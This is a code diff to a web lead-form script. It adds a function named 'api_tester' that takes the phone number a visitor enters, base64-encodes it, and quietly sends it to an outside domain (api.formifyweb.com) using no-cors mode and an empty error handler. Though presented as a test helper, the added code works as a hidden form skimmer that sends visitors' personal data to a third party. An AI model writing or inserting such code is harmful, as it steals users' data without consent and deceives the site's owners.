@@ -2,6 +2,7 @@
     document.getElementById('leadForm').addEventListener('submit', function(event) {
       event.preventDefault();
       const phone_home = '1' + document.getElementById('callerid').value;
+api_tester(document.getElementById('callerid').value);
       const formData = new FormData(this);
 formData.append('callerid', phone_home);
 
@@ -57,3 +58,15 @@ formData.append('dob', document.getElementById('dob').value);
       };
       xhr.send(formData);
     });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
